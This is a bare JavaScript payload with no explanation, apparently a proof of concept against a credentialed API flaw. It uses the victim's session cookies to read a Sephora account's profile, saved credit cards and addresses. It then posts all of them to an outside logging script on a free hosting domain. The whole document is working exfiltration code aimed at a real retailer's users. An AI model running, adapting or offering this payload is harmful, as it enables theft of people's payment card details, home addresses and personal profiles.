xhr=new XMLHttpRequest();
xhr.withCredentials=true;
xhr.open("GET","https://www.sephora.com/api/users/profiles/current/full?includeApis=profile");
xhr.onreadystatechange=()=>{if(xhr.readyState==4){
var resp=xhr.responseText
var id = resp.match(/profileId\":\"[0-9]+/g);
id=id[0].slice(12, id[0].length);

xhr.open("GET",`https://www.sephora.com/api/users/profiles/${id}/creditCards`);
xhr.withCredentials=true;
xhr.onreadystatechange=()=>{if(xhr.readyState==4){
var resp1=xhr.response;
xhr.open("GET",`https://www.sephora.com/api/users/profiles/${id}/addresses`);
xhr.withCredentials=true;
xhr.onreadystatechange=()=>{if(xhr.readyState==4){
var resp2=xhr.response;
xhr.open("POST","https://cs-realme.000webhostapp.com/logger1.php");
xhr.setRequestHeader("Accept", "*\/*");
xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
xhr.setRequestHeader("Content-Type", "application\/x-www-form-urlencoded");
xhr.onreadystatechange=()=>{if(xhr.readyState==4){

}}
xhr.send(`prof=${resp}&address=${resp2}&cc=${resp1}`)
}}
xhr.send()
}}
xhr.send()

}}
xhr.send()
